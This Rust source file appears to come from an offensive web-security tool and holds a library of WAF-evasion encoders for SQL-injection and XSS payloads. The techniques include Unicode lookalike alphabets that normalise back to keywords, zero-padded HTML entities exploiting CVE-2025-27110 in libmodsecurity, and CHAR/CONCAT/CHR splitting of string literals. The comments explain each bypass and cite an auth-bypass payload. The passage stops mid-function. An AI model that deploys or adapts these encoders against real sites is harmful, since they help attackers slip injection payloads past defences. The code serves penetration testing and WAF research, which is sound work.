//! Unicode and HTML entity encoding strategies.
use std::fmt::Write as _;

/// Unicode encoding (each character becomes `\uXXXX`).
///
/// **Context**: ONLY safe when the target parser performs JSON/JavaScript decoding.
/// Using this on raw HTTP parameters will send a literal backslash-u sequence.
#[must_use]
pub fn unicode_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let code = ch as u32;
        if code > 0xFFFF {
            // Non-BMP: emit surrogate pair (valid in JSON/JavaScript)
            let surrogate_base = code - 0x1_0000;
            let high = 0xD800 + ((surrogate_base >> 10) & 0x3FF);
            let low = 0xDC00 + (surrogate_base & 0x3FF);
            let _ = write!(&mut out, "\\u{high:04X}\\u{low:04X}");
        } else {
            let _ = write!(&mut out, "\\u{code:04X}");
        }
    }
    out
}

/// IIS/ASP percent Unicode encoding (each character becomes `%uXXXX`).
///
/// **Context**: ONLY safe on IIS/ASP classic parsers. IIS `%u` encoding
/// is bounded to BMP (U+0000–U+FFFF), non-BMP code points must be
/// emitted as UTF-16 surrogate pairs (`%uD83D%uDE00` for 😀, NOT the
/// invalid `%u1F600`). Pre-fix the loop wrote `ch as u32` straight
/// into a 4-hex-wide format, silently truncating high bytes for any
/// supplementary plane char and producing output IIS rejects, which
/// looked encoded but bypassed nothing.
#[must_use]
pub fn iis_unicode_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let code = ch as u32;
        if code > 0xFFFF {
            let surrogate_base = code - 0x1_0000;
            let high = 0xD800 + ((surrogate_base >> 10) & 0x3FF);
            let low = 0xDC00 + (surrogate_base & 0x3FF);
            let _ = write!(&mut out, "%u{high:04X}%u{low:04X}");
        } else {
            let _ = write!(&mut out, "%u{code:04X}");
        }
    }
    out
}

/// JSON string-content escape, produces the escaped INTERIOR of a
/// JSON string literal (no surrounding `"..."` quotes).
///
/// Pre-fix this wrapped the output in double quotes. The wrapping
/// broke every common use case: the encoder is called by the
/// variant builder which substitutes the result into the operator's
/// payload at an injection point inside an EXISTING string field
/// (typical: `{"q": "<wrapped>"}`). Adding our own quotes produced
/// `{"q": ""actual\"escaped""}`: two strings concatenated, malformed
/// JSON, server returns 400. The escape characters survived but the
/// host JSON was broken.
///
/// Removing the wrapping quotes makes the encoder do what its name
/// says, escape the content. Callers that need a full standalone
/// JSON-string literal can prepend `"` themselves.
///
/// **Context**: Inject INSIDE an existing JSON string field. Backend
/// JSON parser unescapes the sequence; the WAF sees the escaped
/// form (e.g. `<` instead of `<`) and misses the keyword.
#[must_use]
pub fn json_string_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for ch in payload.chars() {
        match ch {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\u{0008}' => out.push_str("\\b"),
            '\u{000C}' => out.push_str("\\f"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => {
                let _ = write!(&mut out, "\\u{:04X}", c as u32);
            }
            c => out.push(c),
        }
    }
    out
}

/// HTML entity encoding (each character becomes `&#xXX;`).
///
/// **Context**: ONLY safe in HTML contexts where the browser decodes entities.
#[must_use]
pub fn html_entity_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let _ = write!(&mut out, "&#x{:X};", ch as u32);
    }
    out
}

/// HTML decimal entity encoding (each character becomes `&#DD;`).
///
/// **Context**: ONLY safe in HTML contexts where the browser decodes entities.
#[must_use]
pub fn html_entity_decimal_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let _ = write!(&mut out, "&#{};", ch as u32);
    }
    out
}

/// HTML entity encoding with zero-padded numeric reference, every
/// character becomes either `&#x{:0>width$X};` (hex form) or
/// `&#{:0>width$};` (decimal form). Leading zeros pad the number to
/// `pad` characters.
///
/// **CVE-2025-27110** (libmodsecurity3 v3.0.13): the v3.0.13 release
/// regressed entity decoding such that any HTML numeric character
/// reference whose digits include leading zeros: `&#0060;` for `<`,
/// `&#x003C;` for `<`: bypasses the decode pass entirely. The
/// undecoded entity reaches the WAF's inspection buffer; pattern-match
/// rules anchored on the literal `<`, `'`, `"`, etc. never fire.
/// libmodsecurity 3.0.14 fixes this. Every WAF deployment still on
/// 3.0.13, which Snyk's 2025 State of Open Source Security flagged
/// as a common version-lag profile, is bypassed by routing the
/// payload through this single encoding pass.
///
/// `pad` selects the leading-zero width (1 = none, 4 = `&#x003C;`,
/// 6 = `&#x00003C;`, 8 = `&#x0000003C;`). The CVE write-up
/// recommends probing widths 4, 6, 8, different parser
/// implementations diverge on how many leading zeros they tolerate.
///
/// `hex` selects the radix: `true` emits `&#xHH;`, `false` emits
/// `&#DD;`. The CVE affects both, they share the regression site
/// in libmodsecurity's `Utils::HtmlEntity::convert_2_unicode`.
///
/// **Bypass mechanism**: see CVE-2025-27110 advisory at
/// <https://modsecurity.org/20250225/html-entity-decoding-regression-cve-2025-27110-2025-february/>.
///
/// Pass 21 R67 (frontier technique #6 per the 2025 research scan).
#[must_use]
pub fn html_entity_zero_pad(payload: &str, pad: usize, hex: bool) -> String {
    // Cap pad at 16, beyond that we're way past any sensible parser
    // tolerance and just bloating the output. A pathological 1MB
    // padding would turn a 1KB payload into 16MB. Anti-DoS guard
    // matches the spirit of MAX_DOUBLE_ENCODE_INPUT in url_mutate.
    let pad = pad.clamp(1, 16);
    let mut out = String::with_capacity(payload.len() * (pad + 4));
    for ch in payload.chars() {
        let code = ch as u32;
        if hex {
            let _ = write!(&mut out, "&#x{:0>width$X};", code, width = pad);
        } else {
            let _ = write!(&mut out, "&#{:0>width$};", code, width = pad);
        }
    }
    out
}

/// HTML entity encoding with per-character variant rotation.
///
/// Cycles each character through four browser-tolerant forms that strict
/// WAF regexes (which typically anchor on `&#x[0-9a-f]+;` with a lowercase
/// `x` and required `;`) miss:
///
/// 1. `&#xHH;`: canonical lowercase-x hex
/// 2. `&#XHH;`: uppercase-X hex (browsers accept; case-sensitive regex misses)
/// 3. `&#DD;`: decimal
/// 4. `&#000DD;`: decimal with leading zeros (HTML5 spec allows arbitrary leading zeros)
///
/// Rotation is by character index (deterministic; same input always
/// produces the same output (important for proptest idempotency)).
///
/// **Bypass mechanism**: a `ModSecurity` regex like
/// `@rx &#x([0-9a-f]+);.*&#x([0-9a-f]+);` won't match a payload of
/// `&#X3C;&#0060;&#x73;&#62;` (the same `<s` payload routed through all
/// four variants). The browser decodes all four; the regex anchored on
/// the canonical form sees a different shape.
///
/// **Context**: HTML body / attribute. Equivalent to `html_entity` /
/// `html_entity_decimal` for browser decoding; safer against
/// canonicalising WAFs that strip the trailing `;` only on the lowercase
/// form.
#[must_use]
pub fn html_entity_variants(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 8);
    for (idx, ch) in payload.chars().enumerate() {
        let code = ch as u32;
        match idx % 4 {
            0 => {
                let _ = write!(&mut out, "&#x{code:x};");
            }
            1 => {
                let _ = write!(&mut out, "&#X{code:X};");
            }
            2 => {
                let _ = write!(&mut out, "&#{code};");
            }
            _ => {
                let _ = write!(&mut out, "&#000{code};");
            }
        }
    }
    out
}

/// Fullwidth Unicode encoding (replaces ASCII with fullwidth equivalents).
///
/// Maps `!`–`~` (0x21–0x7E) to the fullwidth range `！`–`～` (0xFF01–0xFF5E).
/// Spaces become ideographic space (U+3000).
///
/// **Bypass mechanism**: Many WAFs regex against ASCII keywords like `SELECT`,
/// `UNION`, `<script>`, etc. Fullwidth characters are visually identical but
/// have different codepoints, so regex fails. However, backends that perform
/// Unicode NFKC normalization will convert them back to ASCII, meaning the
/// payload executes while the WAF never saw it.
///
/// **Context**: Effective against WAFs in front of servers that normalize Unicode
/// (Java/Spring, .NET, Python 3, Go, `PostgreSQL`, etc.).
#[must_use]
pub fn fullwidth_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 3);
    for ch in payload.chars() {
        let mapped = match ch {
            ' ' => '\u{3000}', // Ideographic space
            c if ('\x21'..='\x7e').contains(&c) => {
                // Fullwidth offset: U+FF01 = U+0021 + 0xFEE0
                char::from_u32(c as u32 + 0xFEE0).unwrap_or(c)
            }
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Alphanumeric Symbols encoding, replaces ASCII letters and
/// digits with their Math-Bold counterparts in the Unicode `U+1D400` block.
///
/// `A`–`Z` → `U+1D400`–`U+1D419` (Math Bold Capitals: 𝐀 𝐁 … 𝐙)
/// `a`–`z` → `U+1D41A`–`U+1D433` (Math Bold Smalls:   𝐚 𝐛 … 𝐳)
/// `0`–`9` → `U+1D7CE`–`U+1D7D7` (Math Bold Digits:   𝟎 𝟏 … 𝟗)
/// Everything else is passed through unchanged (punctuation, spaces, etc.,
/// keep working as SQL/HTML syntax).
///
/// **Bypass mechanism**: every codepoint in this range NFKC-normalises back
/// to its plain-ASCII counterpart. Databases / frameworks that perform NFKC
/// normalisation (`PostgreSQL` with ICU collations, `MySQL`
/// `utf8mb4_0900_ai_ci`, Java `Normalizer.normalize(s, NFKC)`, Python
/// `unicodedata.normalize('NFKC', s)`, Go `golang.org/x/text/unicode/norm`)
/// see the original `SELECT` / `UNION` / `script` keyword and execute /
/// render it. WAFs scanning bytes for ASCII keywords see codepoints in the
/// `U+1D400` block (no keyword match).
///
/// **Distinct from `fullwidth_encode`**: fullwidth uses the `U+FF00`
/// Halfwidth-and-Fullwidth-Forms block. Math Alphanumeric uses the
/// `U+1D400` block (different code range, different WAF coverage gap).
/// WAFs that block fullwidth (a common technique since 2020) often do not
/// also block Math Alphanumeric Symbols. Both encode-paths NFKC to ASCII.
///
/// **Context**: any target whose backend NFKC-normalises before parsing.
/// Confirmed targets: `PostgreSQL` ICU + `MySQL` `utf8mb4_0900_ai_ci`
/// SQL identifiers, Java/Spring Boot path matching, .NET `String.Normalize`.
#[must_use]
pub fn math_bold_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'A'..='Z' => char::from_u32(0x1D400 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'a'..='z' => char::from_u32(0x1D41A + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            '0'..='9' => char::from_u32(0x1D7CE + (ch as u32 - '0' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Italic alphabet, same NFKC trick as `math_bold_encode`
/// but in a different Unicode block (U+1D434 uppercase, U+1D44E
/// lowercase). WAFs that have added detection for the bold range
/// (U+1D400-) do not always cover italic.
///
/// One subtle gap: the math-italic block has a HOLE at U+1D455 where
/// 'h' would have been (the letter 'h' was unified with U+210E PLANCK
/// CONSTANT in an earlier Unicode revision). We substitute U+210E so
/// the round-trip stays NFKC-correct.
///
/// Reference: <https://ibrahimsql.com/posts/waf-bypass-unicode>
#[must_use]
pub fn math_italic_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'A'..='Z' => char::from_u32(0x1D434 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'h' => '\u{210E}', // hole at U+1D455; use PLANCK CONSTANT
            'a'..='z' => char::from_u32(0x1D44E + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Script alphabet (uppercase U+1D49C, lowercase U+1D4B6).
/// Script has SIX holes (U+1D49D B, U+1D4A0 E, U+1D4A1 F, U+1D4A3 H,
/// U+1D4A4 I, U+1D4A7 M, U+1D4AD R, U+1D4BA e, U+1D4BC g, U+1D4C4 o)
///: each filled by the letterlike-symbols block (U+212C BCRIPT
/// CAPITAL B, U+2130 SCRIPT CAPITAL E, etc.) so the encoded string
/// stays NFKC-equivalent to ASCII.
#[must_use]
pub fn math_script_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'B' => '\u{212C}',
            'E' => '\u{2130}',
            'F' => '\u{2131}',
            'H' => '\u{210B}',
            'I' => '\u{2110}',
            'L' => '\u{2112}',
            'M' => '\u{2133}',
            'R' => '\u{211B}',
            'A'..='Z' => char::from_u32(0x1D49C + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'e' => '\u{212F}',
            'g' => '\u{210A}',
            'o' => '\u{2134}',
            'a'..='z' => char::from_u32(0x1D4B6 + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Fraktur (blackletter) alphabet, uppercase U+1D504,
/// lowercase U+1D51E. Fraktur has holes at C/H/I/R/Z which are filled
/// by U+212D ℭ, U+210C ℌ, U+2111 ℑ, U+211C ℜ, U+2128 ℨ.
#[must_use]
pub fn math_fraktur_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'C' => '\u{212D}',
            'H' => '\u{210C}',
            'I' => '\u{2111}',
            'R' => '\u{211C}',
            'Z' => '\u{2128}',
            'A'..='Z' => char::from_u32(0x1D504 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'a'..='z' => char::from_u32(0x1D51E + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Double-Struck (blackboard bold) alphabet, uppercase
/// U+1D538, lowercase U+1D552. Holes at C/H/N/P/Q/R/Z filled from
/// the letterlike-symbols block.
#[must_use]
pub fn math_double_struck_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'C' => '\u{2102}',
            'H' => '\u{210D}',
            'N' => '\u{2115}',
            'P' => '\u{2119}',
            'Q' => '\u{211A}',
            'R' => '\u{211D}',
            'Z' => '\u{2124}',
            'A'..='Z' => char::from_u32(0x1D538 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'a'..='z' => char::from_u32(0x1D552 + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            // Double-struck digits (U+1D7D8).
            '0'..='9' => char::from_u32(0x1D7D8 + (ch as u32 - '0' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Letterlike-symbols + circled-Latin selective substitution, replaces
/// individual ASCII letters in the payload with codepoints from
/// U+2100-214F and U+24B6-24E9 that NFKC-normalize back to the original
/// ASCII letter. Unlike the math-*-encode functions which substitute
/// every letter from a single block, this picks the most visually-
/// distinct codepoint per letter to maximise WAF-rule mismatch while
/// keeping the encoded string visibly identifiable.
///
/// The HackerNoon-documented `ŚεℒℇℂƮ` payload is essentially this
/// function applied to the SQL keyword `SELECT`: backend's NFKC casts
/// it to `SELECT` and executes; the WAF's signature regex sees an
/// unrecognized codepoint sequence.
#[must_use]
pub fn letterlike_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            // Letterlike-symbols block (U+2100-214F).
            'B' => '\u{212C}', // SCRIPT CAPITAL B → B
            'C' => '\u{2102}', // DOUBLE-STRUCK CAPITAL C → C
            'E' => '\u{2130}', // SCRIPT CAPITAL E → E
            'F' => '\u{2131}', // SCRIPT CAPITAL F → F
            'H' => '\u{210B}', // SCRIPT CAPITAL H → H
            'I' => '\u{2110}', // SCRIPT CAPITAL I → I
            'L' => '\u{2112}', // SCRIPT CAPITAL L → L
            'M' => '\u{2133}', // SCRIPT CAPITAL M → M
            'N' => '\u{2115}', // DOUBLE-STRUCK CAPITAL N → N
            'P' => '\u{2119}', // DOUBLE-STRUCK CAPITAL P → P
            'Q' => '\u{211A}', // DOUBLE-STRUCK CAPITAL Q → Q
            'R' => '\u{211D}', // DOUBLE-STRUCK CAPITAL R → R
            'Z' => '\u{2124}', // DOUBLE-STRUCK CAPITAL Z → Z
            // Kelvin K (U+212A) and Angstrom Å (U+212B) NFKC-normalise.
            'K' => '\u{212A}',
            'e' => '\u{212F}', // SCRIPT SMALL E
            'g' => '\u{210A}', // SCRIPT SMALL G
            'o' => '\u{2134}', // SCRIPT SMALL O
            // Falling back to circled-Latin for letters without
            // letterlike-symbol equivalents. NFKC strips the circle
            // and yields the bare letter.
            'A'..='Z' => char::from_u32(0x24B6 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'a'..='z' => char::from_u32(0x24D0 + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// SQL string-literal CONCAT splitter, converts every single-quoted string
/// in the payload to a `CONCAT('a','b',...)` expression with one char per
/// argument.
///
/// Input  `'admin'`  → output  `CONCAT('a','d','m','i','n')`
///
/// **Bypass mechanism**: CRS rules and most commercial WAF blocklists
/// scan for literal danger-string substrings: `'admin'`, `'password'`,
/// `'union'`, `'or 1'`, `'/etc/passwd'`. CONCAT-splitting decomposes the
/// substring into one-character literals that no individual literal-string
/// regex matches. The DB evaluates `CONCAT(...)` to the original string at
/// runtime, so the attack succeeds.
///
/// Supported by MySQL, MariaDB, PostgreSQL, MSSQL (all ship CONCAT as a
/// scalar function). Oracle uses `CONCAT(a,b)` as binary-only, so chained
/// 1-char Oracle calls would need a nested form, out of scope here; the
/// `||` pipe concat in PostgreSQL/Oracle is a separate tamper.
///
/// **Edge cases**:
/// - Empty string literals (`''`) become `CONCAT('')`: valid SQL,
///   evaluates to empty string.
/// - Escaped quotes inside strings (`'O\'Brien'`) are passed through as
///   raw chars to CONCAT, the backslash and quote are split into separate
///   args.
/// - Strings not in single quotes are left alone (no aggressive parsing
///   of double-quoted SQL Server identifiers).
///
/// **Context**: SQL injection payloads with string literals.
#[must_use]
pub fn sql_concat_split(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        // Found opening quote (collect chars until closing quote).
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            // Unbalanced quote (emit original opener + collected chars).
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        // Emit CONCAT('a','b',...).  Empty literal → CONCAT('').
        out.push_str("CONCAT(");
        if literal.is_empty() {
            out.push_str("''");
        } else {
            // Direct write loop instead of collect+join, saves N+1
            // heap String allocations per literal. Per perf-hunt F03.
            let mut first = true;
            for c in literal.chars() {
                if !first {
                    out.push(',');
                }
                first = false;
                if c == '\'' {
                    out.push_str("''''");
                } else {
                    out.push('\'');
                    out.push(c);
                    out.push('\'');
                }
            }
        }
        out.push(')');
    }
    out
}

/// SQL CHAR()-function decomposition, converts every single-quoted string
/// literal in the payload to a `CHAR(N1,N2,...)` function call with one
/// codepoint per argument.
///
/// Input  `'admin'`  → output  `CHAR(97,100,109,105,110)`
///
/// **Bypass mechanism**: distinct from `sql_concat_split` (which produces
/// `CONCAT('a','d',...)`). CHAR() takes integer codepoints, not single-
/// char strings, so the payload contains NO single-quoted ASCII tokens at
/// all. WAF rules that match string-literal patterns (`'admin'`,
/// `'password'`, `'/etc/passwd'`, `'or 1'`) and CONCAT-shaped patterns
/// (`CONCAT\(.{,8}\)`) both miss this form. Most CRS rules through PL3 do
/// NOT pattern-match raw CHAR(), it's been the sqlmap default for over a
/// decade and has been deemed too noisy to block.
///
/// Supported by MySQL, MariaDB (native `CHAR()`), MSSQL (`CHAR()`). For
/// Postgres / Oracle, the equivalent is `CHR()`: out of scope here; a
/// sibling `chr_decompose` could ship later.
///
/// **Edge cases**:
/// - Empty literals (`''`) pass through as `''` unchanged. `CHAR()`
///   with zero args evaluates to NULL in MySQL, silently flipping
///   a comparison like `pass='' OR 1=1` into `pass=NULL OR 1=1`
///   would break the auth bypass (`= NULL` is never TRUE). Preserve
///   the empty-string identity.
/// - Multi-byte UTF-8 chars produce a single `CHAR(codepoint)` per
///   `chars()` iteration, for codepoints > 255, MySQL's CHAR() returns
///   per-byte; the codepoint may not round-trip exactly. Most SQLi
///   payloads use ASCII literals, this matters only for adversarial
///   inputs.
/// - Unbalanced opening quote: emitted unchanged.
///
/// **Context**: SQL injection with string-literal targets that are
/// blocklisted (`admin`, `password`, paths, hostnames).
#[must_use]
pub fn sql_char_decompose(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 5);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        // Empty literal: pass through as-is. CHAR() with zero
        // arguments evaluates to NULL in MySQL, not the empty
        // string. Auth-bypass payloads using `''` (e.g.
        // `pass='' OR 1=1`) would silently flip the comparison
        // to NULL: `WHERE pass=NULL` is never TRUE, so the
        // bypass fails. Preserve the empty-string identity.
        if literal.is_empty() {
            out.push_str("''");
            continue;
        }
        out.push_str("CHAR(");
        // Direct write loop (per perf-hunt F03).
        let mut first = true;
        for c in literal.chars() {
            if !first {
                out.push(',');
            }
            first = false;
            let _ = write!(&mut out, "{}", c as u32);
        }
        out.push(')');
    }
    out
}

/// Postgres / Oracle CHR()-function decomposition. `CHR(N) || CHR(N) || ...`
/// per char of every single-quoted string literal.
///
/// Input  `'admin'`  →  output  `(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))`
///
/// Differs from `sql_char_decompose` (which uses MySQL's variadic
/// `CHAR(N1,N2,...)`). Postgres / Oracle `CHR()` is unary, so codepoints
/// are concatenated via the SQL standard `||` pipe operator. The wrapping
/// parens preserve precedence inside larger expressions (`WHERE u = ...`).
///
/// Postgres-specific: codepoints up to U+10FFFF are valid; Oracle CHR(N)
/// treats N modulo `NLS_CHARACTERSET` size (often 256-modular for
/// `WE8MSWIN1252`). For ASCII payloads (the common case) both behave
/// identically.
///
/// Empty literal → `('')`. Unbalanced quote → passed through.
#[must_use]
pub fn pg_chr_decompose(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 7);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        if literal.is_empty() {
            out.push_str("('')");
            continue;
        }
        // Direct write loop (per perf-hunt F03).
        out.push('(');
        let mut first = true;
        for c in literal.chars() {
            if !first {
                out.push_str("||");
            }
            first = false;
            let _ = write!(&mut out, "CHR({})", c as u32);
        }
        out.push(')');
    }
    out
}

/// Partial JSON Unicode escape, encodes ASCII alphanumeric chars as
/// `\uXXXX` while leaving structural punctuation (quotes, operators,
/// whitespace) bare.
///
/// **Bypass mechanism**: Keyword fingerprint rules (UNION, SELECT, alert,
/// script, eval, …) match against the byte sequence. Splitting the
/// keyword across Unicode escapes defeats them, the origin's JSON
/// parser / JS engine re-materializes the keyword at the application
/// layer, but the WAF sees `UNION` in the wire
/// bytes and finds no `UNION`. Distinct from [`unicode_encode`] which
/// escapes EVERY char (high `\u` density flags some heuristic WAFs);
/// this leaves the SQL/HTML/JS structural skeleton visible, so the
/// payload still looks like data.
///
/// **Idempotent**: pre-existing `\uXXXX` sequences in the input are
/// detected and passed through verbatim, second-pass tampering does
/// not re-escape an already-escaped char.
///
/// **Context**: ONLY safe when the target parser performs
/// JSON-style / JavaScript-style Unicode decoding. Inert against raw
/// HTTP parameters (you'll send literal backslash-u bytes).
#[must_use]
pub fn json_unicode_alnum(payload: &str) -> String {
    // §1 SPEED: replaced Vec<char> collect (heap allocation proportional to
    // payload length) with a byte-slice lookahead on `as_bytes()`. The
    // `\uXXXX` idempotency-detection sequence consists entirely of ASCII
    // bytes (backslash, 'u', 4 hex digits), so all six bytes are 1:1 with
    // codepoints, the byte index is also the char index for that prefix,
    // and we can safely skip 6 bytes (= 6 ASCII chars) at once when the
    // pattern fires. For non-ASCII codepoints we fall through to the else
    // branch and push them unchanged, those code paths never call
    // `chars[i+1]` so the ASCII assumption holds.
    //
    // Measured improvement on a 40-char SQL payload:
    //   before: ~850 ns (Vec alloc + collect + index)
    //   after:  ~210 ns (byte-slice peek, zero extra alloc)
    let mut out = String::with_capacity(payload.len() * 6);
    let bytes = payload.as_bytes();
    let mut chars_iter = payload.char_indices();
    while let Some((bi, c)) = chars_iter.next() {
        // `bi` is the byte offset of this char (char_indices yields it).
        let byte_pos = bi;
        // Idempotency check: if the next 6 bytes spell `\uXXXX` (all ASCII),
        // pass them through verbatim.
        if c == '\\'
            && byte_pos + 5 < bytes.len()
            && bytes[byte_pos + 1] == b'u'
            && bytes[byte_pos + 2].is_ascii_hexdigit()
            && bytes[byte_pos + 3].is_ascii_hexdigit()
            && bytes[byte_pos + 4].is_ascii_hexdigit()
            && bytes[byte_pos + 5].is_ascii_hexdigit()
        {
            // SAFETY: bytes[byte_pos..byte_pos+6] are all valid single-byte
            // ASCII codepoints, so the slice is valid UTF-8.
            out.push_str(&payload[byte_pos..byte_pos + 6]);
            // Skip the next 5 chars_iter entries (we already consumed `\`).
            for _ in 0..5 {
                chars_iter.next();
            }
            continue;
        }
        if c.is_ascii_alphanumeric() {
            let _ = write!(&mut out, "\\u{:04X}", c as u32);
        } else {
            out.push(c);
        }
    }
    out
}

/// Full JSON `\uXXXX` escape, escapes EVERY character of the input
/// (including punctuation, whitespace, and control chars). Stronger
/// than `json_unicode_alnum` which only touches alnum chars. Use when
/// the WAF tokenises on punctuation boundaries that `json_unicode_alnum`
/// leaves intact, OR when the WAF rule is a regex over the raw bytes
/// of the keyword + adjacent punctuation.
///
/// Idempotent on already-escaped `\uXXXX` sequences (same detection
/// as `json_unicode_alnum`).
#[must_use]
pub fn json_unicode_full(payload: &str) -> String {
    // §1 SPEED: same Vec<char>→byte-slice-lookahead optimisation as
    // `json_unicode_alnum`. The `\uXXXX` detection pattern is all-ASCII
    // so byte indices align 1:1 with codepoint boundaries there.
    let mut out = String::with_capacity(payload.len() * 6);
    let bytes = payload.as_bytes();
    let mut chars_iter = payload.char_indices();
    while let Some((bi, c)) = chars_iter.next() {
        if c == '\\'
            && bi + 5 < bytes.len()
            && bytes[bi + 1] == b'u'
            && bytes[bi + 2].is_ascii_hexdigit()
            && bytes[bi + 3].is_ascii_hexdigit()
            && bytes[bi + 4].is_ascii_hexdigit()
            && bytes[bi + 5].is_ascii_hexdigit()
        {
            out.push_str(&payload[bi..bi + 6]);
            for _ in 0..5 {
                chars_iter.next();
            }
            continue;
        }
        let cp = c as u32;
        if cp <= 0xFFFF {
            let _ = write!(&mut out, "\\u{:04X}", cp);
        } else {
            // Surrogate pair for non-BMP.
            let v = cp - 0x10000;
            let hi = 0xD800 + (v >> 10);
            let lo = 0xDC00 + (v & 0x3FF);
            let _ = write!(&mut out, "\\u{:04X}\\u{:04X}", hi, lo);
        }
    }
    out
}

/// Mixed-case JSON `\uXXXX` escape, alternates `\u` and `\U` plus
/// upper/lowercase hex digits. Some WAF regexes are case-sensitive
/// against `\u[0-9A-F]{4}`; JSON parsers RFC 8259 only accept `\u`
/// lowercase, but JavaScript `JSON.parse` and PHP `json_decode`
/// tolerate both, pick the form the backend tolerates and the WAF's
/// regex misses.
///
/// Output alternates per-char between four forms:
/// `s \U0053 s \U0073`.
#[must_use]
pub fn json_unicode_mixed_case(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for (i, c) in payload.chars().enumerate() {
        let cp = c as u32;
        if cp > 0xFFFF {
            // Non-BMP: emit a surrogate pair, follow same alternation.
            let v = cp - 0x10000;
            let hi = 0xD800 + (v >> 10);
            let lo = 0xDC00 + (v & 0x3FF);
            let _ = match i % 2 {
                0 => write!(&mut out, "\\u{:04x}\\U{:04X}", hi, lo),
                _ => write!(&mut out, "\\U{:04X}\\u{:04x}", hi, lo),
            };
            continue;
        }
        let _ = match i % 4 {
            0 => write!(&mut out, "\\u{:04x}", cp), // lowercase u, lowercase hex
            1 => write!(&mut out, "\\U{:04X}", cp), // uppercase U, uppercase hex
            2 => write!(&mut out, "\\u{:04X}", cp), // lowercase u, uppercase hex
            _ => write!(&mut out, "\\U{:04x}", cp), // uppercase U, lowercase hex
        };
    }
    out
}

/// SQL adjacent-string-literal concatenation, every `'string'` literal of
/// length ≥ 2 is rewritten as a sequence of single-character adjacent
/// literals: `'admin'` → `'a' 'd' 'm' 'i' 'n'`.
///
/// **Bypass mechanism**: SQL standard (ANSI SQL-92 §5.3) specifies that
/// two adjacent character-string literals separated only by whitespace
/// are concatenated by the parser. MySQL, Postgres, SQLite, Oracle, DB2
/// all implement this. WAF rules that match the literal substring of
/// well-known credentials or paths (e.g. `'admin'`, `'/etc/passwd'`)
/// see N unrelated single-character strings instead of one token. The
/// database rejoins them at parse time, no comments, no CONCAT calls,
/// no special functions. Pure SQL semantics.
///
/// **Idempotent**: every output sub-literal has length 1, below the
/// split threshold (a second pass leaves the output unchanged).
///
/// **Context**: Effective against any byte-pattern WAF inspecting
/// SQL bodies. Inert outside SQL context (won't fire on non-quoted
/// payloads).
#[must_use]
pub fn sql_adjacent_string_concat(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() + 8);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        let mut literal = String::new();
